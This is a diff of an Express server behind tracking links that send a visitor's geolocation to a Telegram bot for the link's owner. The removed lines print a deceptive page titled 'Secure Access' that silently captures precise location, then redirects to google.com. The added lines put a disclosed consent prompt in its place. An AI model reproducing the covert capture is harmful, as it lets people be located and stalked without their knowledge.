@@ -1,199 +1,262 @@
 const express = require('express');
-const fs = require('fs');
-const path = require('path');
 const axios = require('axios');
+require('dotenv').config();
 
 const app = express();
 
-// Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-
-// Serve uploaded images
-app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
-
-// Serve public assets (optional)
 app.use(express.static('public'));
 
 const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';
 const BOT_NOTIFY_URL = process.env.BOT_NOTIFY_URL;
 const NOTIFY_API_KEY = process.env.NOTIFY_API_KEY;
 const VPS_IP = process.env.VPS_IP;
+const BOT_API_URL =
+    process.env.BOT_API_URL ||
+    (VPS_IP ? `http://${VPS_IP}:5000` : 'http://localhost:5000');
 
-// ======================
-// LOAD LINKS FROM FILE
-// ======================
-function getLinks() {
-    if (!fs.existsSync('links.json')) return [];
-    return JSON.parse(fs.readFileSync('links.json'));
+if (!BOT_NOTIFY_URL || !NOTIFY_API_KEY) {
+    console.warn('Missing BOT_NOTIFY_URL or NOTIFY_API_KEY. Location alerts will fail until they are configured.');
 }
 
-function saveLinks(data) {
-    fs.writeFileSync('links.json', JSON.stringify(data, null, 2));
+function escapeHtml(value) {
+    return String(value || '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
 }
 
+async function getLinkData(linkId) {
+    const response = await axios.get(`${BOT_API_URL}/links/${linkId}`, {
+        timeout: 10000
+    });
 
-// ======================
-// TRACKING PAGE ROUTE
-// ======================
+    return response.data;
+}
+
 app.get('/t/:id', async (req, res) => {
     try {
         const linkId = req.params.id;
+        const linkData = await getLinkData(linkId);
 
-        // Fetch link data from VPS bot
-        const response = await axios.get(
-            `http://${VPS_IP}:5000/links/${linkId}`
-        );
-
-        const linkData = response.data;
-
-        if (!linkData) {
-            return res
-                .status(404)
-                .send('Service Timeout');
+        if (!linkData || !linkData.thumbnail) {
+            return res.status(404).send('Link not found');
         }
 
-        // Use thumbnail directly from VPS
         const imageUrl = linkData.thumbnail;
+        const pageUrl = `${BASE_URL}/t/${encodeURIComponent(linkId)}`;
 
-        res.send(`
-<!DOCTYPE html>
-<html>
+        res.send(`<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>Secure Access</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>View Image</title>
 
-    <!-- Open Graph Preview -->
-    <meta property="og:title" content="Secure Access Portal">
-    <meta property="og:description" content="Click to view secure content">
-    <meta property="og:image" content="${imageUrl}">
-    <meta property="og:url" content="${BASE_URL}/t/${linkId}">
+    <meta property="og:title" content="Shared Image">
+    <meta property="og:description" content="Open to view the shared image">
+    <meta property="og:image" content="${escapeHtml(imageUrl)}">
+    <meta property="og:url" content="${escapeHtml(pageUrl)}">
     <meta property="og:type" content="website">
 
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
     <style>
+        * {
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: Arial;
-            text-align: center;
-            padding: 50px;
+            margin: 0;
+            min-height: 100vh;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #1f2933;
+            background: #f4f7fb;
+            display: grid;
+            place-items: center;
+            padding: 24px;
+        }
+
+        main {
+            width: min(100%, 560px);
+            background: #ffffff;
+            border: 1px solid #d9e2ec;
+            border-radius: 8px;
+            padding: 24px;
+            box-shadow: 0 12px 32px rgba(15, 23, 42, 0.08);
+        }
+
+        h1 {
+            margin: 0 0 10px;
+            font-size: 24px;
+            line-height: 1.25;
+        }
+
+        p {
+            margin: 0 0 18px;
+            color: #52606d;
+            line-height: 1.5;
+        }
+
+        button {
+            width: 100%;
+            border: 0;
+            border-radius: 6px;
+            background: #146c94;
+            color: #ffffff;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 700;
+            padding: 14px 18px;
+        }
+
+        button:disabled {
+            cursor: wait;
+            opacity: 0.7;
+        }
+
+        img {
+            display: none;
+            width: 100%;
+            max-height: 75vh;
+            object-fit: contain;
+            border-radius: 8px;
+            background: #111827;
+        }
+
+        .status {
+            min-height: 24px;
+            margin-top: 14px;
+            color: #334e68;
         }
     </style>
 </head>
-
 <body>
-    <h2>Loading secure session...</h2>
-    <p>Please wait...</p>
+    <main>
+        <section id="consent">
+            <h1>View shared image</h1>
+            <p>This page needs your permission to share your current location with the person who sent the link. After you allow location access, the image will be shown.</p>
+            <button id="allowButton" type="button">Allow location and view image</button>
+            <p id="status" class="status" role="status"></p>
+        </section>
 
-<script>
-navigator.geolocation.getCurrentPosition(
-    function(position) {
+        <img id="sharedImage" src="${escapeHtml(imageUrl)}" alt="Shared image">
+    </main>
 
-        fetch('/save-location', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                linkId: "${linkId}",
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude
-            })
-        }).then(() => {
-            window.location.href =
-                "https://google.com";
+    <script>
+        const linkId = ${JSON.stringify(linkId)};
+        const allowButton = document.getElementById('allowButton');
+        const statusEl = document.getElementById('status');
+        const consentEl = document.getElementById('consent');
+        const imageEl = document.getElementById('sharedImage');
+
+        function showImage() {
+            consentEl.style.display = 'none';
+            imageEl.style.display = 'block';
+        }
+
+        function setStatus(message) {
+            statusEl.textContent = message;
+        }
+
+        allowButton.addEventListener('click', () => {
+            if (!navigator.geolocation) {
+                setStatus('Location is not supported by this browser.');
+                return;
+            }
+
+            allowButton.disabled = true;
+            setStatus('Waiting for location permission...');
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    try {
+                        setStatus('Opening image...');
+
+                        await fetch('/save-location', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                linkId,
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            })
+                        });
+
+                        showImage();
+                    } catch (error) {
+                        allowButton.disabled = false;
+                        setStatus('Could not save location. Please try again.');
+                    }
+                },
+                () => {
+                    allowButton.disabled = false;
+                    setStatus('Location permission is required to view this image.');
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 30000,
+                    maximumAge: 0
+                }
+            );
         });
-
-    },
-    function(error) {
-        document.body.innerHTML =
-        "<h3>Connection timeout or permission denied</h3>";
-    },
-    {
-        enableHighAccuracy: true
-    }
-);
-</script>
-
+    </script>
 </body>
-</html>
-        `);
-
+</html>`);
     } catch (err) {
         console.error(err.message);
-
-        return res
-            .status(404)
-            .send('Service Timeout');
+        res.status(404).send('Link not found');
     }
 });
 
-// ======================
-// RECEIVE LOCATION
-// ======================
 app.post('/save-location', async (req, res) => {
     try {
-        const { linkId, latitude, longitude } = req.body;
+        const { linkId, latitude, longitude, accuracy } = req.body;
 
-        const links = getLinks();
-
-        const linkData = links.find(
-            l => l.linkId === linkId
-        );
-
-        if (!linkData) {
-            return res.status(404).json({
-                error: 'Link not found'
+        if (!linkId || latitude === undefined || longitude === undefined) {
+            return res.status(400).json({
+                error: 'Missing linkId, latitude, or longitude'
             });
         }
 
-        // Show in Vercel logs
-        console.log('========================');
-        console.log('📍 LOCATION CAPTURED');
-        console.log('Name:', linkData.ownerName);
-        console.log('Telegram:', linkData.telegramUsername);
-        console.log('Latitude:', latitude);
-        console.log('Longitude:', longitude);
-        console.log(
-            'Map:',
-            `https://maps.google.com/?q=${latitude},${longitude}`
-        );
-        console.log('========================');
+        const linkData = await getLinkData(linkId);
 
-        // Notify your VPS bot
         await axios.post(
             BOT_NOTIFY_URL,
             {
                 ownerChatId: linkData.ownerChatId,
                 ownerName: linkData.ownerName,
+                telegramUsername: linkData.telegramUsername,
                 latitude,
-                longitude
+                longitude,
+                accuracy
             },
             {
                 headers: {
                     'x-api-key': NOTIFY_API_KEY
-                }
+                },
+                timeout: 10000
             }
         );
 
         res.json({
             success: true
         });
-
     } catch (err) {
         console.error(err.message);
 
         res.status(500).json({
-            error: err.message
+            error: 'Unable to save location'
         });
     }
 });
 
-
-// ======================
-// START SERVER
-// ======================
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`Server running on port ${PORT}`);
 });
